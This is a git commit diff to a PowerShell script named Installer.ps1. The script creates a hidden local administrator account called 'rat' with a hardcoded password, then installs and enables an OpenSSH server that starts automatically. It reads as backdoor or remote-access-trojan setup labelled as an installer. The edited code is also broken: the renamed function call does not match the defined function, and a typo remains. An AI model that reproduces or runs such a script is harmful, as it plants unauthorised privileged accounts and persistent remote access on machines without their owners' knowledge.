037cb9fa7304628724ca8bec707ab9f8fb8a712b
lukeeeeeee335 <lukeeeeeee334@gmail.com>
2026-01-25 22:20:09 +0000

    test1

--- files/Installer.ps1
+++ files/Installer.ps1
@@ -11,25 +11,25 @@ function random_text{
 function create_account {
     [CmdletBidning()]
     param (
-        [string] $uname,
-        [securestring] $pword
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )
     begin {
     }
     process {
-        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
-        Write-Verbose "$uname local user crated"
-        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
-        Write-Verbose "$uname added to the local administrator group"
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user crated"
+        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
+        Write-Verbose "$NewLocalAdmin added to the local administrator group"
 
     }
     end {
     }
 }
 #create admin user
-$uname = "rat"
-$pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
-create_account -uname $uname -pword $pword
+$NewLocalAdmin = "rat"
+$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 #goto temp and make working directory
 $wd = random_text
@@ -67,7 +67,6 @@ pause
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
 
 # 
 
